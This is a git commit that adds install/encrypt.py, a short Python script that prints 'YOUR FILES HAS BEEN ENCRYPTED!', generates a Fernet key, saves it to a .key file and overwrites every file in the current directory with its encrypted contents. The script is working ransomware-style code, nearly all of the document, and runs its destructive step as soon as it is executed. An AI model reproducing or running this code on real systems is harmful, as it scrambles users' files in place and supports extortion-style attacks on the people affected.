7114fa5d28871505b20c1235c3040084df00892a
Justine Dela Torre <97047918+Jasut1n@users.noreply.github.com>
2022-05-27 17:47:57 +0800

    Module

---
+++ install/encrypt.py
@@ -0,0 +1,37 @@
+#!/bin/env python
+
+import os
+from cryptography.fernet import Fernet
+
+__author__ = ("Justine Dela Torre (Jasutin)")
+
+__all__ = ['encrypt', 'decrypt']
+
+print("\tYOUR FILES HAS BEEN ENCRYPTED!\n")
+
+files = []
+
+for file in os.listdir():
+    if file == ".decrypt" or file == ".key" or file == ".secret" or file == ".encrypt":
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+print(files)
+
+key = Fernet.generate_key()
+
+with open(".key", "wb") as decryptionkey:
+    decryptionkey.write(key)
+
+for file in files:
+    with open(file, "rb") as enjasu:
+        contents = enjasu.read()
+    contents_encrypted = Fernet(key).encrypt(contents)
+    with open(file, "wb") as enjasu:
+        enjasu.write(contents_encrypted)
+
+exit()
+
+
+
